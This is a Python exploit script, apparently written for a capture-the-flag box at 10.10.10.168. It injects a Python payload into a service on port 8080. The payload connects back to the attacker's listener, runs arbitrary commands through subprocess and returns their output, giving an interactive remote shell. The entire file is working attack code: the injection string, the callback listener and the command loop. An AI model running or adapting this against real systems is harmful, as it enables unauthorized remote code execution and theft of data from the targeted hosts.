import socket, os, sys, threading, readline

if len(sys.argv)<2: # Parsing arguments
    print("Too few arguments.")
    print("Usage : exploit.py <tun0>")
    exit()

payload1 = "a ';s=socket.socket();s.connect(('{}',{}));s.sendall(subprocess.check_output({})+b'\b');' a\na" # Payload that we will send to the target
PORT = None

def AcceptConn():
    global conn, PORT

    sockbind = socket.socket()    # Creating an initial socket for binding
    sockbind.bind(("0.0.0.0", 0)) # Bindinf the socket to a certain port
    sockbind.listen(2)            # listening for incoming traffics

    PORT = sockbind.getsockname()[1] # Setting the port for the payload

    while 1:
        conn, addr = sockbind.accept() # Accepting connections

threading.Thread(target=AcceptConn).start() # Creating a thread to listen for ports

while 1:
    command = input("Cmd >> ") # Asking for output as a loop

    sockpay = socket.socket()               # Creating a socket to end the payload
    sockpay.connect(("10.10.10.168", 8080)) # Connect to port 8080 of the box
    sockpay.sendall(payload1.format(        # Sending the payload to the target
        sys.argv[1],
        PORT,''.join(str(command.split(" ")).split(" "))
        ).encode()
    )
    sockpay.close(); del sockpay             # Killing the socket and replace it with another one

    while True: # Recieving the data that is sent back by the target
        try:
            data = conn.recv(2000).decode()
            while not data:
                data = conn.recv(2000).decode()
            while data[-1] != "\b":
            	data += conn.recv(2000).decode()
            print(data)
            conn.close(); del conn
            break
        except NameError:
            pass
